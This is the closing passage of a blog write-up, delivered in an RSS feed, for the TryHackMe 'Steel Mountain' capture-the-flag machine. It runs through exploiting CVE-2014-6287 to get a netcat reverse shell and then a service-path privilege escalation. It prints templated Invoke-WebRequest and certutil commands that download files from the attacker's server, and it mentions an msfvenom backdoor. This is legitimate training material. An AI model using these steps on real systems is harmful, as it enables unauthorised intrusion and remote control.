&lt;p&gt;&lt;br /&gt;-&amp;gt; Copy &lt;strong&gt;Advanced.exe&lt;/strong&gt; or create a new backdoor executable with &lt;strong&gt;msfvenom&lt;/strong&gt; just like before.
&lt;br /&gt;-&amp;gt; Download &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat&quot;&gt;&lt;strong&gt;winPEAS.bat&lt;/strong&gt;&lt;/a&gt;
&lt;br /&gt;-&amp;gt; Download static binary &lt;a href=&quot;https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe&quot;&gt;&lt;strong&gt;nc.exe&lt;/strong&gt;&lt;/a&gt;
&lt;br /&gt;-&amp;gt; Download &lt;a href=&quot;https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1&quot;&gt;&lt;strong&gt;PowerUp.ps1&lt;/strong&gt;&lt;/a&gt; or use the previous one if you downloaded it before.
&lt;br /&gt;-&amp;gt; Download &lt;a href=&quot;https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/cve20146287.py&quot;&gt;&lt;strong&gt;CVE-2014-6287.py&lt;/strong&gt;&lt;/a&gt; or from &lt;a href=&quot;https://www.exploit-db.com/exploits/39161&quot;&gt;&lt;strong&gt;Exploitdb&lt;/strong&gt;&lt;/a&gt;
&lt;br /&gt;&lt;br /&gt;Your directory should look like this
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/20.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;2-exploitation&quot;&gt;2-Exploitation&lt;/h2&gt;
&lt;p&gt;Edit the &lt;strong&gt;cve20146287.py&lt;/strong&gt; file, set the &lt;strong&gt;ip_addr&lt;/strong&gt; field to your THM IP, and set the &lt;strong&gt;local_port&lt;/strong&gt; to any free port.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/25.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Start a &lt;strong&gt;netcat&lt;/strong&gt; listener on the port you declared in the &lt;strong&gt;python&lt;/strong&gt; file.
&lt;br /&gt;Run it twice. At first run the server will download &lt;strong&gt;nc.exe&lt;/strong&gt; static binary from your server. At second, it will run
&lt;strong&gt;nc.exe&lt;/strong&gt; to connect to your local machine by providing a CMD prompt.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/21.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;It is possible to use PowerUp.ps1 again or &lt;strong&gt;winPEAS.bat&lt;/strong&gt; can be used to enumerate misconfigurations.
&lt;br /&gt;You can download any file from the running python server by using one of these utilites.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YOUR&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SERVER&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;YOU&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WANT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TO&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DOWNLOAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on &lt;strong&gt;Advanced System Care9&lt;/strong&gt;
service and many others.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/23.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
You will need to repeat previous steps to get the root flag. Download &lt;strong&gt;Advanced.exe&lt;/strong&gt; with &lt;br /&gt;&lt;strong&gt;Invoke-WebRequest&lt;/strong&gt; or
&lt;strong&gt;certutil&lt;/strong&gt;, start a Netcat listener and restart the service.
&lt;br /&gt;
&lt;br /&gt;
That is the end for this machine, wish you more penetrations ;)&lt;/p&gt;
</description>
        <pubDate>Wed, 22 Dec 2021 21:50:00 +0000</pubDate>
        <link>http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/</guid>
        
        <category>TryHackme Machines</category>
        
        <category>ctf</category>
        
        <category>pentesting</category>
        
        <category>remote-code-execution</category>
        
        <category>windows-privesc</category>
        
        <category>powershell</category>
        
        <category>metasploit</category>
        
        <category>unqoted-service-path</category>
        
        
      </item>
    
  </channel>
</rss>
